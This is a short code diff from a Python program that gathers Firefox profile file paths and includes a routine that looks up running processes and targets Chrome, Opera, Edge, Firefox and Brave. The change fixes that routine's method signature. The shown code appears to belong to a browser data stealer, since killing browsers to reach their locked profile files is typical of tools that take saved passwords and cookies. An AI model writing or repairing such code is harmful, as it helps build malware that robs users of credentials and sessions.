@@ -183,7 +183,7 @@ class Main:
                             self.FirefoxFilesFullPath.append(file_path)
         except:
             pass
-    async def kill_browsers():
+    async def kill_browsers(self):
         process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe"]
         process = await asyncio.create_subprocess_shell(
             'tasklist',
